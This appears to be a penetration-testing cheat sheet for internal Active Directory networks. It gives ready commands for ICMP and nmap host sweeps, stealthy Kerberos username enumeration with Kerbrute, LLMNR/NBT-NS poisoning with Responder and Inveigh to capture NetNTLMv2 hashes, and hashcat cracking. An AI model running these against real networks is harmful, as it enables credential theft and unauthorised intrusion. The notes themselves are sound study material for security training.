# Active identification of any hosts in the network
### FPing Active Checks
A lightweight, fast utility for performing ICMP sweeps.
```shell
fping -asgq 10.10.5.0/23
```
### Nmap Scanning
AD Focus protocols (Ports): DNS, SMB, LDAP, Kerberos.
```shell
sudo nmap -v -A -iL hosts.txt -oN host-enum
```
Hostes Gathered from fping
## Identifying Users
### Kerbrute - Internal AD Username Enumeration
[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the `jsmith.txt` or `jsmith2.txt` user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users.
```shell
kerbrute userenum -d [DOMAIN] --dc [IP_ADDRESS] [WORDLIST]
kerbrute userenum -d domain.local --dc 172.16.5.5 jsmith.txt
```
# LLMNR/NBT-NS Poisoning
Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.
The point here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests. By this we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password.
## LLMNR/NBT-NS Poisoning - from Linux
Passive analysis mode (only sniffs/alerts, no poisoning).
```shell
sudo responder -I <interface> -A
```
Active attack mode (performs poisoning + captures hashes).
```shell
sudo responder -I <interface> -wrfv
```
log file per host located in the `/usr/share/responder/logs`
#### Cracking an NTLMv2 Hash With Hashcat
``` shell
hashcat -m 5600 hash_ntlmv2 /usr/share/wordlists/rockyou.txt
```
## LLMNR/NBT-NS Poisoning - from Windows
By using tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) and attempt to capture another set of credentials. [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.

On powershell (Open as admin)
``` powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
_Note_: PowerShell terminal must run with admin priv.
Using .exe
Inveigh [v2.0.11](https://github.com/Kevin-Robertson/Inveigh/releases/tag/v2.0.11)
steps on powershell (opened as admin)
```powershell
.\Inveigh.exe
```
_Note_: During capturing you can Press ESC to enter/exit interactive console, After typing `HELP` and hitting enter, we are presented with several options:
- We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`
- We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected.
